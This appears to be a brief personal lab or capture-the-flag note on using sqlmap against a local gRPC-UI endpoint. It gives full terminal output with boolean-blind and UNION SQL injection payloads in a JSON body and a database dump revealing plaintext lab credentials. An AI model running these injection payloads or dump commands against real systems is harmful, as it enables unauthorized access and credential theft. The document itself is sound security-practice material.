
found out about sqlmap from garr and used it for the first time

it's possible to get the data from just using burp sqli too

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -r ~/request.txt --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.8#stable}
|_ -| . [)]     | .´| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user´s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:52:26 /2023-08-31/

[21:52:26] [INFO] parsing HTTP request from '/home/kali/request3.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[21:52:26] [INFO] resuming back-end DBMS 'sqlite' 
[21:52:26] [INFO] testing connection to the target URL
[21:52:27] [INFO] testing if the target URL content is stable
[21:52:27] [INFO] target URL content is stable
[21:52:27] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
[21:52:27] [INFO] (custom) POST parameter 'JSON #1*' appears to be dynamic
[21:52:27] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
[21:52:27] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
[21:52:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:52:27] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[21:52:27] [INFO] testing 'Generic inline queries'
[21:52:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[21:52:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:52:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[21:52:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[21:52:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:52:28] [WARNING] time-based comparison requires larger statistical model, please wait................. (done)          
[21:52:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:52:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[21:52:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:52:28] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[21:52:28] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[21:52:28] [INFO] testing 'Oracle AND time-based blind'
[21:52:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:52:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:52:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:52:29] [INFO] target URL appears to have 1 column in query
[21:52:29] [INFO] (custom) POST parameter 'JSON #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidXNlcm5hbWUiLCJleHAiOjE2OTM1MjA3ODZ9.TGjXGSGCDQZClwmZNLZRVrEFLlqs2g-H1AUr34iXBeM"}],"data":[{"id":"1 AND 7563=7563"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidXNlcm5hbWUiLCJleHAiOjE2OTM1MjA3ODZ9.TGjXGSGCDQZClwmZNLZRVrEFLlqs2g-H1AUr34iXBeM"}],"data":[{"id":"-5004 UNION ALL SELECT CHAR(113,122,112,106,113)||CHAR(108,98,71,100,73,87,115,114,109,74,111,80,81,86,90,116,78,76,115,90,65,100,67,82,118,108,111,80,113,65,76,122,76,88,102,101,121,118,87,102)||CHAR(113,122,120,106,113)-- EXbr"}]}
---
[21:52:29] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[21:52:29] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 21:52:29 /2023-08-31/
```

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -r ~/request3.txt --batch --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.8#stable}
|_ -| . [)]     | .´| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user´s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:57:33 /2023-08-31/

[21:57:33] [INFO] parsing HTTP request from '/home/kali/request3.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[21:57:33] [INFO] resuming back-end DBMS 'sqlite' 
[21:57:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidXNlcm5hbWUiLCJleHAiOjE2OTM1MjA3ODZ9.TGjXGSGCDQZClwmZNLZRVrEFLlqs2g-H1AUr34iXBeM"}],"data":[{"id":"1 AND 7563=7563"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidXNlcm5hbWUiLCJleHAiOjE2OTM1MjA3ODZ9.TGjXGSGCDQZClwmZNLZRVrEFLlqs2g-H1AUr34iXBeM"}],"data":[{"id":"-5004 UNION ALL SELECT CHAR(113,122,112,106,113)||CHAR(108,98,71,100,73,87,115,114,109,74,111,80,81,86,90,116,78,76,115,90,65,100,67,82,118,108,111,80,113,65,76,122,76,88,102,101,121,118,87,102)||CHAR(113,122,120,106,113)-- EXbr"}]}
---
[21:57:33] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[21:57:33] [INFO] fetching tables for database: 'SQLite_masterdb'
[21:57:33] [INFO] fetching columns for table 'accounts' 
[21:57:33] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

[21:57:33] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'                                                                                               
[21:57:33] [INFO] fetching columns for table 'messages' 
[21:57:33] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+

[21:57:33] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv'                                                                                               
[21:57:33] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 21:57:33 /2023-08-31/
```


